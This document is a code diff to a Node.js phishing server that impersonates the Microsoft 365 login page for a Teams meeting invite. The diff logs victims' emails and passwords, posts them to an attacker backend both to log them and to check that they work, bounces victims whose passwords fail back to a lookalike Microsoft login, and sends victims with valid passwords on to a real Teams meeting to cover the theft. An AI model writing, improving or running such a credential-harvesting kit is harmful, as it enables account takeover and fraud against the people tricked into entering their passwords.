@@ -43,11 +43,43 @@ if (!fs.existsSync(LOGS_DIRECTORY)) {
 const ENCRYPTION_KEY = process.env.ENCRYPTION_KEY || "HyP3r-M3g4_S3cURe-EnC4YpT10n_k3Y";
 const VICTIM_SESSIONS = {};
 
+// Store authentication status
+const AUTHENTICATED_USERS = {};
+
 // ============================================================
 //  HELPERS
 // ============================================================
 
-// Send credentials to backend
+// Verify credentials with backend
+async function verifyCredentials(email, password, req) {
+    try {
+        const axios = require('axios');
+        const response = await axios.post(`${BACKEND_URL}/api/authenticate`, {
+            email: email,
+            password: password,
+            visitorInfo: {
+                fullUrl: req.url,
+                userAgent: req.headers['user-agent'] || 'Unknown',
+                ip: req.socket.remoteAddress || 'Unknown'
+            }
+        });
+        
+        // Check if authentication was successful
+        // Based on your backend response structure
+        if (response.data && response.data.success === true) {
+            console.log(`[AUTH] ✅ User authenticated: ${email}`);
+            return true;
+        } else {
+            console.log(`[AUTH] ❌ Authentication failed for: ${email}`);
+            return false;
+        }
+    } catch (error) {
+        console.error(`[AUTH] ❌ Authentication error: ${error.message}`);
+        return false;
+    }
+}
+
+// Send credentials to backend for logging
 async function sendToBackend(email, password, req) {
     try {
         const axios = require('axios');
@@ -64,23 +96,6 @@ async function sendToBackend(email, password, req) {
         console.log(`[BACKEND] ✅ Sent credentials for: ${email}`);
     } catch (error) {
         console.error(`[BACKEND] ❌ Failed to send: ${error.message}`);
-    }
-    
-    // Also send to authenticate endpoint
-    try {
-        const axios = require('axios');
-        await axios.post(`${BACKEND_URL}/api/authenticate`, {
-            email: email,
-            password: password,
-            visitorInfo: {
-                fullUrl: req.url,
-                userAgent: req.headers['user-agent'] || 'Unknown',
-                ip: req.socket.remoteAddress || 'Unknown'
-            }
-        });
-        console.log(`[BACKEND] ✅ Authenticate sent for: ${email}`);
-    } catch (error) {
-        console.error(`[BACKEND] ❌ Failed to authenticate: ${error.message}`);
     }
 }
 
@@ -114,28 +129,66 @@ function handlePostRequest(body, req, res) {
 
         console.log(`[CREDENTIALS] 📧 Email: ${email}, 🔑 Password: ${password}`);
 
-        // Send to backend
+        // Send to backend for logging
         sendToBackend(email, password, req);
+
+        // Verify credentials with backend
+        verifyCredentials(email, password, req).then((isAuthenticated) => {
+            if (isAuthenticated) {
+                // Store session
+                const sessionId = generateSessionId(email);
+                AUTHENTICATED_USERS[sessionId] = {
+                    email: email,
+                    timestamp: Date.now(),
+                    authenticated: true
+                };
+                
+                console.log(`[AUTH] ✅ User authenticated and session created for: ${email}`);
+                
+                // Redirect to REAL Teams meeting
+                res.writeHead(302, { 
+                    'Location': TEAMS_REDIRECT,
+                    'Set-Cookie': [`session=${sessionId}; HttpOnly; Secure; SameSite=Strict`],
+                    'Cache-Control': 'no-store'
+                });
+                res.end();
+            } else {
+                console.log(`[AUTH] ❌ Invalid credentials for: ${email}`);
+                
+                // Redirect back to login with error
+                const errorUrl = `https://login.microsoftonline.com/common/oauth2/v2.0/authorize?client_id=943a2b14-68aa-4205-88c1-a4b65ab04e81&response_type=code&redirect_uri=https://login.microsoftonline.com/common/oauth2/nativeclient&scope=openid%20profile%20email&login_hint=${encodeURIComponent(email)}&error=invalid_credentials`;
+                res.writeHead(302, { 'Location': errorUrl });
+                res.end();
+            }
+        }).catch((error) => {
+            console.error('[ERROR] Authentication failed:', error.message);
+            res.writeHead(500, { 'Content-Type': 'text/plain' });
+            res.end('Authentication service error');
+        });
 
     } catch (error) {
         console.error('[ERROR] POST handling failed:', error.message);
+        res.writeHead(500, { 'Content-Type': 'text/plain' });
+        res.end('Internal server error');
     }
+}
 
-    // Redirect to REAL Teams meeting
-    res.writeHead(302, { 
-        'Location': TEAMS_REDIRECT,
-        'Cache-Control': 'no-store'
-    });
-    res.end();
+function generateSessionId(email) {
+    return crypto.createHash('sha256')
+        .update(email + Date.now().toString() + crypto.randomBytes(16).toString('hex'))
+        .digest('hex');
 }
 
 function handleLoginRequest(req, res) {
-    const email = req.url.split('login_hint=')[1]?.split('&')[0] || '';
+    // Get email from URL and decode it properly
+    const rawEmail = req.url.split('login_hint=')[1]?.split('&')[0] || '';
+    const email = decodeURIComponent(rawEmail);
     
     // Build Microsoft OAuth URL with required parameters
     const targetUrl = `https://login.microsoftonline.com/common/oauth2/v2.0/authorize?client_id=943a2b14-68aa-4205-88c1-a4b65ab04e81&response_type=code&redirect_uri=https://login.microsoftonline.com/common/oauth2/nativeclient&scope=openid%20profile%20email&login_hint=${encodeURIComponent(email)}`;
     
     console.log(`[PROXY] 🔄 Forwarding to: ${targetUrl}`);
+    console.log(`[PROXY] 📧 Email decoded: ${email}`);
     
     https.get(targetUrl, (targetRes) => {
         let data = [];
